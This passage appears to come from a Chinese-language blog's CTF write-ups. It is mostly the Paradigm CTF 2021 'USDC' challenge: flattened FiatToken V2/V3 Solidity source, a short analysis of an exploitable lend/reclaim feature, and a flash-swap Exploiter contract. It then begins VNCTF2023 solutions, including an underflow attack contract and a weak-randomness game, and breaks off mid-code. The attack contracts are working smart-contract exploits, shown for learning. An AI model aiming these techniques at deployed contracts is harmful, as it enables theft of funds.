internal\n        view\n        returns (bytes32)\n    &#123;\n        uint256 chainId;\n        assembly &#123;\n            chainId := chainid()\n        &#125;\n        return\n            keccak256(\n                abi.encode(\n                    0x8b73c3c69bb8fe3d512ecc4cf759cc79239f7b179b0ffacaa9a75d522b39400f,\n                    // = keccak256(\"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\")\n                    keccak256(bytes(name)),\n                    keccak256(bytes(version)),\n                    chainId,\n                    address(this)\n                )\n            );\n    &#125;\n\n    /**\n     * @notice Recover signer's address from a EIP712 signature\n     * @param domainSeparator   Domain separator\n     * @param v                 v of the signature\n     * @param r                 r of the signature\n     * @param s                 s of the signature\n     * @param typeHashAndData   Type hash concatenated with data\n     * @return Signer's address\n     */\n    function recover(\n        bytes32 domainSeparator,\n        uint8 v,\n        bytes32 r,\n        bytes32 s,\n        bytes memory typeHashAndData\n    ) internal pure returns (address) &#123;\n        bytes32 digest = keccak256(\n            abi.encodePacked(\n                \"\\x19\\x01\",\n                domainSeparator,\n                keccak256(typeHashAndData)\n            )\n        );\n        return ECRecover.recover(digest, v, r, s);\n    &#125;\n&#125;\n\n// File: contracts/v2/EIP712Domain.sol\n\n/**\n * License: MIT\n *\n * Copyright (c) 2018-2020 CENTRE SECZ\n *\n * Permission is hereby granted, free of charge, to any person obtaining a copy\n * of this software and associated documentation files (the \"Software\"), to deal\n * in the Software without restriction, including without limitation the rights\n * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n * copies of the Software, and to permit persons to whom the Software is\n * furnished to do so, subject to the following conditions:\n *\n * The above copyright notice and this permission notice shall be included in\n * copies or substantial portions of the Software.\n *\n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n * SOFTWARE.\n */\n\n\n/**\n * @title EIP712 Domain\n */\ncontract EIP712Domain &#123;\n    /**\n     * @dev EIP712 Domain Separator\n     */\n    bytes32 public DOMAIN_SEPARATOR;\n&#125;\n\nabstract contract GasAbstraction is AbstractFiatTokenV2, EIP712Domain &#123;\n    bytes32\n        public constant TRANSFER_WITH_AUTHORIZATION_TYPEHASH = 0x7c7c6cdb67a18743f49ec6fa9b35f50d52ed05cbed4cc592e13b44501c1a2267;\n    // = keccak256(\"TransferWithAuthorization(address from,address to,uint256 value,uint256 validAfter,uint256 validBefore,bytes32 nonce)\")\n    bytes32\n        public constant APPROVE_WITH_AUTHORIZATION_TYPEHASH = 0x808c10407a796f3ef2c7ea38c0638ea9d2b8a1c63e3ca9e1f56ce84ae59df73c;\n    // = keccak256(\"ApproveWithAuthorization(address owner,address spender,uint256 value,uint256 validAfter,uint256 validBefore,bytes32 nonce)\")\n    bytes32\n        public constant INCREASE_ALLOWANCE_WITH_AUTHORIZATION_TYPEHASH = 0x424222bb050a1f7f14017232a5671f2680a2d3420f504bd565cf03035c53198a;\n    // = keccak256(\"IncreaseAllowanceWithAuthorization(address owner,address spender,uint256 increment,uint256 validAfter,uint256 validBefore,bytes32 nonce)\")\n    bytes32\n        public constant DECREASE_ALLOWANCE_WITH_AUTHORIZATION_TYPEHASH = 0xb70559e94cbda91958ebec07f9b65b3b490097c8d25c8dacd71105df1015b6d8;\n    // = keccak256(\"DecreaseAllowanceWithAuthorization(address owner,address spender,uint256 decrement,uint256 validAfter,uint256 validBefore,bytes32 nonce)\")\n    bytes32\n        public constant CANCEL_AUTHORIZATION_TYPEHASH = 0x158b0a9edf7a828aad02f63cd515c68ef2f50ba807396f6d12842833a1597429;\n    // = keccak256(\"CancelAuthorization(address authorizer,bytes32 nonce)\")\n\n    enum AuthorizationState &#123; Unused, Used, Canceled &#125;\n\n    /**\n     * @dev authorizer address => nonce => authorization state\n     */\n    mapping(address => mapping(bytes32 => AuthorizationState))\n        private _authorizationStates;\n\n    event AuthorizationUsed(address indexed authorizer, bytes32 indexed nonce);\n    event AuthorizationCanceled(\n        address indexed authorizer,\n        bytes32 indexed nonce\n    );\n\n    /**\n     * @notice Returns the state of an authorization\n     * @param authorizer    Authorizer's address\n     * @param nonce         Nonce of the authorization\n     * @return Authorization state\n     */\n    function authorizationState(address authorizer, bytes32 nonce)\n        external\n        view\n        returns (AuthorizationState)\n    &#123;\n        return _authorizationStates[authorizer][nonce];\n    &#125;\n\n    /**\n     * @notice Verify a signed transfer authorization and execute if valid\n     * @param from          Payer's address (Authorizer)\n     * @param to            Payee's address\n     * @param value         Amount to be transferred\n     * @param validAfter    The time after which this is valid (unix time)\n     * @param validBefore   The time before which this is valid (unix time)\n     * @param nonce         Unique nonce\n     * @param v             v of the signature\n     * @param r             r of the signature\n     * @param s             s of the signature\n     */\n    function _transferWithAuthorization(\n        address from,\n        address to,\n        uint256 value,\n        uint256 validAfter,\n        uint256 validBefore,\n        bytes32 nonce,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) internal &#123;\n        _requireValidAuthorization(from, nonce, validAfter, validBefore);\n\n        bytes memory data = abi.encode(\n            TRANSFER_WITH_AUTHORIZATION_TYPEHASH,\n            from,\n            to,\n            value,\n            validAfter,\n            validBefore,\n            nonce\n        );\n        require(\n            EIP712.recover(DOMAIN_SEPARATOR, v, r, s, data) == from,\n            \"FiatTokenV2: invalid signature\"\n        );\n\n        _markAuthorizationAsUsed(from, nonce);\n        _transfer(from, to, value);\n    &#125;\n\n    /**\n     * @notice Verify a signed authorization for an increase in the allowance\n     * granted to the spender and execute if valid\n     * @param owner         Token owner's address (Authorizer)\n     * @param spender       Spender's address\n     * @param increment     Amount of increase in allowance\n     * @param validAfter    The time after which this is valid (unix time)\n     * @param validBefore   The time before which this is valid (unix time)\n     * @param nonce         Unique nonce\n     * @param v             v of the signature\n     * @param r             r of the signature\n     * @param s             s of the signature\n     */\n    function _increaseAllowanceWithAuthorization(\n        address owner,\n        address spender,\n        uint256 increment,\n        uint256 validAfter,\n        uint256 validBefore,\n        bytes32 nonce,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) internal &#123;\n        _requireValidAuthorization(owner, nonce, validAfter, validBefore);\n\n        bytes memory data = abi.encode(\n            INCREASE_ALLOWANCE_WITH_AUTHORIZATION_TYPEHASH,\n            owner,\n            spender,\n            increment,\n            validAfter,\n            validBefore,\n            nonce\n        );\n        require(\n            EIP712.recover(DOMAIN_SEPARATOR, v, r, s, data) == owner,\n            \"FiatTokenV2: invalid signature\"\n        );\n\n        _markAuthorizationAsUsed(owner, nonce);\n        _increaseAllowance(owner, spender, increment);\n    &#125;\n\n    /**\n     * @notice Verify a signed authorization for a decrease in the allowance\n     * granted to the spender and execute if valid\n     * @param owner         Token owner's address (Authorizer)\n     * @param spender       Spender's address\n     * @param decrement     Amount of decrease in allowance\n     * @param validAfter    The time after which this is valid (unix time)\n     * @param validBefore   The time before which this is valid (unix time)\n     * @param nonce         Unique nonce\n     * @param v             v of the signature\n     * @param r             r of the signature\n     * @param s             s of the signature\n     */\n    function _decreaseAllowanceWithAuthorization(\n        address owner,\n        address spender,\n        uint256 decrement,\n        uint256 validAfter,\n        uint256 validBefore,\n        bytes32 nonce,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) internal &#123;\n        _requireValidAuthorization(owner, nonce, validAfter, validBefore);\n\n        bytes memory data = abi.encode(\n            DECREASE_ALLOWANCE_WITH_AUTHORIZATION_TYPEHASH,\n            owner,\n            spender,\n            decrement,\n            validAfter,\n            validBefore,\n            nonce\n        );\n        require(\n            EIP712.recover(DOMAIN_SEPARATOR, v, r, s, data) == owner,\n            \"FiatTokenV2: invalid signature\"\n        );\n\n        _markAuthorizationAsUsed(owner, nonce);\n        _decreaseAllowance(owner, spender, decrement);\n    &#125;\n\n    /**\n     * @notice Verify a signed approval authorization and execute if valid\n     * @param owner         Token owner's address (Authorizer)\n     * @param spender       Spender's address\n     * @param value         Amount of allowance\n     * @param validAfter    The time after which this is valid (unix time)\n     * @param validBefore   The time before which this is valid (unix time)\n     * @param nonce         Unique nonce\n     * @param v             v of the signature\n     * @param r             r of the signature\n     * @param s             s of the signature\n     */\n    function _approveWithAuthorization(\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 validAfter,\n        uint256 validBefore,\n        bytes32 nonce,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) internal &#123;\n        _requireValidAuthorization(owner, nonce, validAfter, validBefore);\n\n        bytes memory data = abi.encode(\n            APPROVE_WITH_AUTHORIZATION_TYPEHASH,\n            owner,\n            spender,\n            value,\n            validAfter,\n            validBefore,\n            nonce\n        );\n        require(\n            EIP712.recover(DOMAIN_SEPARATOR, v, r, s, data) == owner,\n            \"FiatTokenV2: invalid signature\"\n        );\n\n        _markAuthorizationAsUsed(owner, nonce);\n        _approve(owner, spender, value);\n    &#125;\n\n    /**\n     * @notice Attempt to cancel an authorization\n     * @param authorizer    Authorizer's address\n     * @param nonce         Nonce of the authorization\n     * @param v             v of the signature\n     * @param r             r of the signature\n     * @param s             s of the signature\n     */\n    function _cancelAuthorization(\n        address authorizer,\n        bytes32 nonce,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) internal &#123;\n        _requireUnusedAuthorization(authorizer, nonce);\n\n        bytes memory data = abi.encode(\n            CANCEL_AUTHORIZATION_TYPEHASH,\n            authorizer,\n            nonce\n        );\n        require(\n            EIP712.recover(DOMAIN_SEPARATOR, v, r, s, data) == authorizer,\n            \"FiatTokenV2: invalid signature\"\n        );\n\n        _authorizationStates[authorizer][nonce] = AuthorizationState.Canceled;\n        emit AuthorizationCanceled(authorizer, nonce);\n    &#125;\n\n    /**\n     * @notice Check that an authorization is unused\n     * @param authorizer    Authorizer's address\n     * @param nonce         Nonce of the authorization\n     */\n    function _requireUnusedAuthorization(address authorizer, bytes32 nonce)\n        private\n        view\n    &#123;\n        require(\n            _authorizationStates[authorizer][nonce] ==\n                AuthorizationState.Unused,\n            \"FiatTokenV2: authorization is used or canceled\"\n        );\n    &#125;\n\n    /**\n     * @notice Check that authorization is valid\n     * @param authorizer    Authorizer's address\n     * @param nonce         Nonce of the authorization\n     * @param validAfter    The time after which this is valid (unix time)\n     * @param validBefore   The time before which this is valid (unix time)\n     */\n    function _requireValidAuthorization(\n        address authorizer,\n        bytes32 nonce,\n        uint256 validAfter,\n        uint256 validBefore\n    ) private view &#123;\n        require(\n            now > validAfter,\n            \"FiatTokenV2: authorization is not yet valid\"\n        );\n        require(now &lt; validBefore, \"FiatTokenV2: authorization is expired\");\n        _requireUnusedAuthorization(authorizer, nonce);\n    &#125;\n\n    /**\n     * @notice Mark an authorization as used\n     * @param authorizer    Authorizer's address\n     * @param nonce         Nonce of the authorization\n     */\n    function _markAuthorizationAsUsed(address authorizer, bytes32 nonce)\n        private\n    &#123;\n        _authorizationStates[authorizer][nonce] = AuthorizationState.Used;\n        emit AuthorizationUsed(authorizer, nonce);\n    &#125;\n&#125;\n\n// File: contracts/v2/Permit.sol\n\n/**\n * License: MIT\n *\n * Copyright (c) 2018-2020 CENTRE SECZ\n *\n * Permission is hereby granted, free of charge, to any person obtaining a copy\n * of this software and associated documentation files (the \"Software\"), to deal\n * in the Software without restriction, including without limitation the rights\n * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n * copies of the Software, and to permit persons to whom the Software is\n * furnished to do so, subject to the following conditions:\n *\n * The above copyright notice and this permission notice shall be included in\n * copies or substantial portions of the Software.\n *\n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n * SOFTWARE.\n */\n\n\n/**\n * @title Permit\n * @notice An alternative to approveWithAuthorization, provided for\n * compatibility with the draft EIP2612 proposed by Uniswap.\n * @dev Differences:\n * - Uses sequential nonce, which restricts transaction submission to one at a\n *   time, or else it will revert\n * - Has deadline (= validBefore - 1) but does not have validAfter\n * - Doesn't have a way to change allowance atomically to prevent ERC20 multiple\n *   withdrawal attacks\n */\nabstract contract Permit is AbstractFiatTokenV2, EIP712Domain &#123;\n    bytes32\n        public constant PERMIT_TYPEHASH = 0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9;\n    // = keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\")\n\n    mapping(address => uint256) private _permitNonces;\n\n    /**\n     * @notice Nonces for permit\n     * @param owner Token owner's address (Authorizer)\n     * @return Next nonce\n     */\n    function nonces(address owner) external view returns (uint256) &#123;\n        return _permitNonces[owner];\n    &#125;\n\n    /**\n     * @notice Verify a signed approval permit and execute if valid\n     * @param owner     Token owner's address (Authorizer)\n     * @param spender   Spender's address\n     * @param value     Amount of allowance\n     * @param deadline  The time at which this expires (unix time)\n     * @param v         v of the signature\n     * @param r         r of the signature\n     * @param s         s of the signature\n     */\n    function _permit(\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) internal &#123;\n        require(deadline >= now, \"FiatTokenV2: permit is expired\");\n\n        bytes memory data = abi.encode(\n            PERMIT_TYPEHASH,\n            owner,\n            spender,\n            value,\n            _permitNonces[owner]++,\n            deadline\n        );\n        require(\n            EIP712.recover(DOMAIN_SEPARATOR, v, r, s, data) == owner,\n            \"FiatTokenV2: invalid signature\"\n        );\n\n        _approve(owner, spender, value);\n    &#125;\n&#125;\n\n// File: contracts/v2/FiatTokenV2.sol\n\n/**\n * License: MIT\n *\n * Copyright (c) 2018-2020 CENTRE SECZ\n *\n * Permission is hereby granted, free of charge, to any person obtaining a copy\n * of this software and associated documentation files (the \"Software\"), to deal\n * in the Software without restriction, including without limitation the rights\n * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n * copies of the Software, and to permit persons to whom the Software is\n * furnished to do so, subject to the following conditions:\n *\n * The above copyright notice and this permission notice shall be included in\n * copies or substantial portions of the Software.\n *\n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n * SOFTWARE.\n */\n\n\n/**\n * @title FiatToken V2\n * @notice ERC20 Token backed by fiat reserves, version 2\n */\ncontract FiatTokenV2 is FiatTokenV1_1, GasAbstraction, Permit &#123;\n    bool internal _initializedV2;\n\n    /**\n     * @notice Initialize V2 contract\n     * @dev When upgrading to V2, this function must also be invoked by using\n     * upgradeToAndCall instead of upgradeTo, or by calling both from a contract\n     * in a single transaction.\n     * @param newName   New token name\n     */\n    function initializeV2(string calldata newName) external &#123;\n        require(\n            !_initializedV2,\n            \"FiatTokenV2: contract is already initialized\"\n        );\n        name = newName;\n        DOMAIN_SEPARATOR = EIP712.makeDomainSeparator(newName, \"2\");\n        _initializedV2 = true;\n    &#125;\n\n    /**\n     * @notice Increase the allowance by a given increment\n     * @param spender   Spender's address\n     * @param increment Amount of increase in allowance\n     * @return True if successful\n     */\n    function increaseAllowance(address spender, uint256 increment)\n        external\n        whenNotPaused\n        notBlacklisted(msg.sender)\n        notBlacklisted(spender)\n        returns (bool)\n    &#123;\n        _increaseAllowance(msg.sender, spender, increment);\n        return true;\n    &#125;\n\n    /**\n     * @notice Decrease the allowance by a given decrement\n     * @param spender   Spender's address\n     * @param decrement Amount of decrease in allowance\n     * @return True if successful\n     */\n    function decreaseAllowance(address spender, uint256 decrement)\n        external\n        whenNotPaused\n        notBlacklisted(msg.sender)\n        notBlacklisted(spender)\n        returns (bool)\n    &#123;\n        _decreaseAllowance(msg.sender, spender, decrement);\n        return true;\n    &#125;\n\n    /**\n     * @notice Execute a transfer with a signed authorization\n     * @param from          Payer's address (Authorizer)\n     * @param to            Payee's address\n     * @param value         Amount to be transferred\n     * @param validAfter    The time after which this is valid (unix time)\n     * @param validBefore   The time before which this is valid (unix time)\n     * @param nonce         Unique nonce\n     * @param v             v of the signature\n     * @param r             r of the signature\n     * @param s             s of the signature\n     */\n    function transferWithAuthorization(\n        address from,\n        address to,\n        uint256 value,\n        uint256 validAfter,\n        uint256 validBefore,\n        bytes32 nonce,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external whenNotPaused notBlacklisted(from) notBlacklisted(to) &#123;\n        _transferWithAuthorization(\n            from,\n            to,\n            value,\n            validAfter,\n            validBefore,\n            nonce,\n            v,\n            r,\n            s\n        );\n    &#125;\n\n    /**\n     * @notice Update allowance with a signed authorization\n     * @param owner         Token owner's address (Authorizer)\n     * @param spender       Spender's address\n     * @param value         Amount of allowance\n     * @param validAfter    The time after which this is valid (unix time)\n     * @param validBefore   The time before which this is valid (unix time)\n     * @param nonce         Unique nonce\n     * @param v             v of the signature\n     * @param r             r of the signature\n     * @param s             s of the signature\n     */\n    function approveWithAuthorization(\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 validAfter,\n        uint256 validBefore,\n        bytes32 nonce,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external whenNotPaused notBlacklisted(owner) notBlacklisted(spender) &#123;\n        _approveWithAuthorization(\n            owner,\n            spender,\n            value,\n            validAfter,\n            validBefore,\n            nonce,\n            v,\n            r,\n            s\n        );\n    &#125;\n\n    /**\n     * @notice Increase allowance with a signed authorization\n     * @param owner         Token owner's address (Authorizer)\n     * @param spender       Spender's address\n     * @param increment     Amount of increase in allowance\n     * @param validAfter    The time after which this is valid (unix time)\n     * @param validBefore   The time before which this is valid (unix time)\n     * @param nonce         Unique nonce\n     * @param v             v of the signature\n     * @param r             r of the signature\n     * @param s             s of the signature\n     */\n    function increaseAllowanceWithAuthorization(\n        address owner,\n        address spender,\n        uint256 increment,\n        uint256 validAfter,\n        uint256 validBefore,\n        bytes32 nonce,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external whenNotPaused notBlacklisted(owner) notBlacklisted(spender) &#123;\n        _increaseAllowanceWithAuthorization(\n            owner,\n            spender,\n            increment,\n            validAfter,\n            validBefore,\n            nonce,\n            v,\n            r,\n            s\n        );\n    &#125;\n\n    /**\n     * @notice Decrease allowance with a signed authorization\n     * @param owner         Token owner's address (Authorizer)\n     * @param spender       Spender's address\n     * @param decrement     Amount of decrease in allowance\n     * @param validAfter    The time after which this is valid (unix time)\n     * @param validBefore   The time before which this is valid (unix time)\n     * @param nonce         Unique nonce\n     * @param v             v of the signature\n     * @param r             r of the signature\n     * @param s             s of the signature\n     */\n    function decreaseAllowanceWithAuthorization(\n        address owner,\n        address spender,\n        uint256 decrement,\n        uint256 validAfter,\n        uint256 validBefore,\n        bytes32 nonce,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external whenNotPaused notBlacklisted(owner) notBlacklisted(spender) &#123;\n        _decreaseAllowanceWithAuthorization(\n            owner,\n            spender,\n            decrement,\n            validAfter,\n            validBefore,\n            nonce,\n            v,\n            r,\n            s\n        );\n    &#125;\n\n    /**\n     * @notice Attempt to cancel an authorization\n     * @dev Works only if the authorization is not yet used.\n     * @param authorizer    Authorizer's address\n     * @param nonce         Nonce of the authorization\n     * @param v             v of the signature\n     * @param r             r of the signature\n     * @param s             s of the signature\n     */\n    function cancelAuthorization(\n        address authorizer,\n        bytes32 nonce,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external whenNotPaused &#123;\n        _cancelAuthorization(authorizer, nonce, v, r, s);\n    &#125;\n\n    /**\n     * @notice Update allowance with a signed permit\n     * @param owner       Token owner's address (Authorizer)\n     * @param spender     Spender's address\n     * @param value       Amount of allowance\n     * @param deadline    Expiration time, seconds since the epoch\n     * @param v           v of the signature\n     * @param r           r of the signature\n     * @param s           s of the signature\n     */\n    function permit(\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external whenNotPaused notBlacklisted(owner) notBlacklisted(spender) &#123;\n        _permit(owner, spender, value, deadline, v, r, s);\n    &#125;\n\n    /**\n     * @notice Internal function to increase the allowance by a given increment\n     * @param owner     Token owner's address\n     * @param spender   Spender's address\n     * @param increment Amount of increase\n     */\n    function _increaseAllowance(\n        address owner,\n        address spender,\n        uint256 increment\n    ) internal override &#123;\n        _approve(owner, spender, allowed[owner][spender].add(increment));\n    &#125;\n\n    /**\n     * @notice Internal function to decrease the allowance by a given decrement\n     * @param owner     Token owner's address\n     * @param spender   Spender's address\n     * @param decrement Amount of decrease\n     */\n    function _decreaseAllowance(\n        address owner,\n        address spender,\n        uint256 decrement\n    ) internal override &#123;\n        _approve(\n            owner,\n            spender,\n            allowed[owner][spender].sub(\n                decrement,\n                \"ERC20: decreased allowance below zero\"\n            )\n        );\n    &#125;\n&#125;\n\n/**\n * @title FiatToken V3\n * @notice ERC20 Token backed by fiat reserves, version 3\n */\ncontract FiatTokenV3 is FiatTokenV2 &#123;\n    // ensure we start on a new storage slot just in case\n    uint private _gap;\n\n    bool internal _initializedV3;\n\n    mapping(address => mapping(address => uint256)) private _loans;\n\n    /**\n     * @notice Initialize V3 contract\n     * @dev When upgrading to V3, this function must also be invoked by using\n     * upgradeToAndCall instead of upgradeTo, or by calling both from a contract\n     * in a single transaction.\n     */\n    function initializeV3() external &#123;\n        require(\n            !_initializedV3,\n            \"FiatTokenV3: contract is already initialized\"\n        );\n        DOMAIN_SEPARATOR = EIP712.makeDomainSeparator(name, \"3\");\n        _initializedV3 = true;\n    &#125;\n\n    /**\n     * @notice Lends some tokens to the specified address\n     * @param to        Recipient's address\n     * @param amount    Loan amount\n     * @return True if successful\n     */\n    function lend(address to, uint amount)\n        external\n        whenNotPaused\n        notBlacklisted(msg.sender)\n        notBlacklisted(to)\n        returns (bool)\n    &#123;\n        _loans[msg.sender][to] = _loans[msg.sender][to].add(amount);\n\n        _transfer(msg.sender, to, amount);\n        return true;\n    &#125;\n\n    /**\n     * @notice Reclaims previously lent tokens\n     * @param from      The account to which tokens were lent\n     * @param amount    Reclaim amount\n     * @return True if successful\n     */\n    function reclaim(address from, uint amount)\n        external\n        whenNotPaused\n        notBlacklisted(msg.sender)\n        notBlacklisted(from)\n        returns (bool)\n    &#123;\n        _loans[msg.sender][from] = _loans[msg.sender][from].sub(amount, \"FiatTokenV3: decreased loans below zero\");\n\n        _transfer(from, msg.sender, amount);\n        return true;\n    &#125;\n&#125;\n\nabstract contract ERC20Like &#123;\n    function balanceOf(address user) external virtual view returns (uint);\n&#125;\n\nabstract contract FiatTokenProxyLike is ERC20Like &#123;\n    function changeAdmin(address newAdmin) external virtual;\n\n    function upgradeTo(address newImplementation) external virtual;\n&#125;\n\ncontract Setup &#123;\n    FiatTokenProxyLike private constant USDC = FiatTokenProxyLike(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);\n\n    function upgrade() external &#123;\n        FiatTokenV3 v3 = new FiatTokenV3();\n        v3.initialize(\"\", \"\", \"\", 0, address(0x01), address(0x01), address(0x01), address(0x01));\n        v3.initializeV2(\"\");\n        v3.initializeV3();\n\n        USDC.upgradeTo(address(v3));\n        USDC.changeAdmin(0x807a96288A1A408dBC13DE2b1d087d10356395d2);\n        FiatTokenV3(address(USDC)).initializeV3();\n    &#125;\n\n    function isSolved() external view returns (bool) &#123;\n        return USDC.balanceOf(address(this)) > 200_000_000e6;\n    &#125;\n&#125;\n\n\n\nAnalyse\nClick to see flow chart\n\n\n\n看一下合约的借贷功能，很好理解\nfunction lend(address to, uint amount) external returns (bool) &#123;\n    _loans[msg.sender][to] = _loans[msg.sender][to].add(amount);\n    _transfer(msg.sender, to, amount);\n    return true;\n&#125;\n\nfunction reclaim(address from, uint amount) external returns (bool) &#123;\n    _loans[msg.sender][from] = _loans[msg.sender][from].sub(amount, \"FiatTokenV3: decreased loans below zero\");\n    _transfer(from, msg.sender, amount);\n    return true;\n&#125;\n\n可以指定to地址进行借出又可以直接进行还款操作（在to地址有token的情况下），借贷两个操作都集中在单方面，所以很容易出现安全问题\nsuch as：\n首先通过flash loan功能借出200_000_000e6的token，我们在将全部toke借给flash loan的来源合约，回调函数为空或者直接reclaim，自然就会通过flashloan的判断，之后我们就可以调用reclaim函数恰钱了！在transfer给FiatToken v3，通关！\nAttackcontract Exploiter &#123;\n    FiatTokenV3 public constant USDC = FiatTokenV3(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);\n    IWETH9 public constant WETH = IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\n    IUniswapV2Pair public constant USDCWETH = IUniswapV2Pair(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);\n    \n    function swap(uint256 amount) external payable &#123;\n        uint256 value = msg.value;\n        WETH.deposit&#123;value: value&#125;();\n        WETH.transfer(address(USDCWETH), value);\n        USDCWETH.swap(amount, 0, address(this), \"\");\n    &#125;\n    \n    function exploit(IUniswapV2Pair pair, uint256 amount0, uint256 amount1) external &#123;\n        pair.swap(amount0, amount1, address(this), \"0x123456\");\n        uint256 paid = (amount0 + amount1) * 1004 / 1000;\n        USDC.reclaim(address(pair), paid);\n    &#125;\n    \n    function uniswapV2Call(address, uint amount0, uint amount1, bytes calldata) external &#123;\n        uint256 topay = (amount0 + amount1) * 1004 / 1000;\n        USDC.lend(msg.sender, topay);\n    &#125;\n    \n    function withdraw(address to, uint256 amount) external &#123;\n        USDC.transfer(to, amount);\n    &#125;\n&#125;\n\n","slug":"Paradigm  CTF 2021","date":"2022-10-15T12:42:45.830Z","categories_index":"","tags_index":"区块链","author_index":"bcYng"},{"id":"7b3ace99200e1da5abf0dd22cabd2b45","title":"VNCTF2023","content":"0x01 SignInCodepragma solidity 0.4.23;\ncontract Checkin &#123;\n   string public welcomeMessage ;\n   uint16 public year ;\n   constructor ( string _mssg )&#123;\n     welcomeMessage =_mssg ; \n     year =2022;\n   &#125;\n\n   function setMsg ( string _welcomeMessage ,uint16 _newyear ) public &#123;\n     welcomeMessage =_welcomeMessage ; year = year - _newyear ;\n   &#125;\n\n   function uintTostr (uint256 _i )public pure \n   returns ( string memory _uintAsstring )&#123;\n     uint256 number =_i ;\n     if ( number == 0)\n        return \"0\";\n     uint256 j = number ;\n     uint256 len ;\n     while ( j != 0)&#123;\n        len ++;\n        j /=10;\n     &#125;\n     bytes memory bstr = new bytes ( len );\n     uint256 k = len -1;\n     while ( number !=0)&#123;\n        bstr[k--]=bytes1(uint8(48+( number %10))); \n        number /=10;\n     &#125;\n        return string ( bstr );\n   &#125;\n   \n\n   function strConcat ( string _a , string _b ) internal returns ( string )&#123;\n     bytes memory _ba = bytes (_a);\n     bytes memory _bb = bytes (_b);\n     string memory ret = new string (_ba.length +_bb.length); \n     bytes memory bret = bytes ( ret );\n     uint256 k =0;\n     for (uint256 i =0; i &lt;_ba.length ; i++)\n        bret[k++]=_ba[i]; \n     for ( i =0; i &lt;_bb.length;i++) \n        bret[k++]=_bb[i];\n     return string ( ret );\n     &#125;\n\n\n     function issolved () public view returns ( bool )&#123;\n        var msg = strConcat ( welcomeMessage , uintTostr(year));\n        return (keccak256( abi.encodePacked (\"Welcome to VNCTF2023\"))==keccak256(abi.encodePacked (msg)));\n   &#125;\n&#125;\n\nAnalyse看起来有些唬人，就是实现了字符串的拼接，下溢2023即可\nAttackcontract attack&#123;\n   function pwn(address _target)public &#123;\n      Checkin  target = Checkin(_target);\n      target.setMsg(\"Welcome to VNCTF\",uint16(-1));\n   &#125;\n&#125;\n\n0x02Codepragma solidity ^0.8.7;\n\ncontract GuessGame &#123;\n    address private GamblingHouseOwner;\n    address public Player;\n    mapping(address => uint256) PlayerWins;\n    mapping(address => bool) GetMoney;\n    mapping(address => uint256) PlayerPool;\n    uint256 public PlayerGuess;\n\n    constructor() payable &#123;\n        GamblingHouseOwner = msg.sender;\n        //5eth\n    &#125;\n\n    function despositFunds(address _addr) private &#123;\n        PlayerPool[_addr] = PlayerPool[_addr] + msg.value;\n    &#125;\n\n    function guess(uint256 _guess) external payable &#123;\n        require(_guess == 0 || _guess == 1);\n        require(Player == address(0));\n        require(msg.value == 1 ether);\n        Player = msg.sender;\n        despositFunds(msg.sender);\n        PlayerGuess = _guess;\n    &#125;\n\n    function RandomCoin() private view returns (uint256) &#123;\n        return\n            uint256(keccak256(abi.encodePacked(block.timestamp ^ 0x1234567))) %\n            2;\n    &#125;\n\n    function revealResult() external &#123;\n        require(Player == msg.sender);\n        uint256 winningOption = RandomCoin();\n        if 